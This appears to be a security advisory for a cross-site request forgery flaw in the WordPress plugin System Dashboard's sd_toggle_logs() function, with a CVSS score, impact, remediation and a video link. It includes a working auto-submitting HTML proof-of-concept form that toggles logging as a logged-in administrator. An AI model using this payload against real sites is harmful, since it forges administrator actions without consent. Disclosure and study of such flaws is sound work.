#  Cross-Site Request Forgery (CSRF) in Plugin System Dashboard (Funtion sd_toggle_logs)

**Vulnerability Type:** Cross-Site Request Forgery (CSRF)

**Affected Function:** sd_toggle_logs()

**CVSS v3.1:** 4.3 (Medium)    
**Vector:** AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:L/A:N    
*(Note: Score reflects unauthorized state change requiring an admin victim and user interaction.)*

**Description of Vulnerability:**

The function `sd_toggle_logs()` processes sensitive operations such as enabling/disabling Page Access Logs, Error Logs, and Email Delivery Logs. However, it relies solely on the `$_REQUEST['log_type']` parameter and a capability check `(current_user_can( 'manage_options' ))` without implementing CSRF protection (e.g., `check_admin_referer()` or a nonce).

As a result, an attacker can lure a logged-in Administrator to visit a malicious page that silently submits a crafted request, causing unintended enable/disable changes to site logging.

## Impact:

- Unauthorized state changes for site logging features (Page Access Log, Error Log, Email Delivery Log).

- If error logging is enabled, the site may begin writing application errors to a file path determined by the plugin (increasing the chance of operational information disclosure via logs), but the direct impact of this issue is the state toggle itself.

## POC 
When a logged-in User with `manage_options` visits the attacker’s page, the respective logging feature is toggled without explicit consent.
``` html
 <body>
    <form action="http://victim.com/wordpress/wp-admin/admin-ajax.php">
      <input type="hidden" name="action" value="sd&#95;toggle&#95;logs" />
      <input type="hidden" name="log&#95;type" value="errors&#95;log" />
      <input type="hidden" name="fast&#95;ajax" value="true" />
      <input type="hidden" name="load&#95;plugins&#91;&#93;" value="system&#45;dashboard&#47;system&#45;dashboard&#46;php" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
## Remediation

- Implement WordPress nonces (`check_admin_referer()` or `wp_verify_nonce()`) to validate requests.

- Restrict sensitive actions to POST requests only.

- Avoid relying solely on capability checks for protection against CSRF.

## Video POC
If you're unable to reproduce the issue exactly as described in the report, please refer to the following video demonstration (PoC) for a clear reproduction scenario:

https://youtu.be/WtWYIfEM4W0
